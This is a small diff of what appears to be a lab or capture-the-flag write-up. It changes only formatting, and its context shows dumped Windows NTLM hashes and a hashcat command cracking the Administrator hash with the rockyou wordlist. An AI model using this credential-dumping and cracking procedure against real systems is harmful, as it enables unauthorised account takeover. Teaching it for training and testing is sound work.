@@ -24,7 +24,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 [*] Cleaning up... 
 ```
 
-We can then use the output of `Administrator` as a hash for `hashcat`:
+We can then use the output of `Administrator` as a hash for hashcat:
 ```bash
 $ hashcat -a 0 -m 1000 admin-hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
 ...
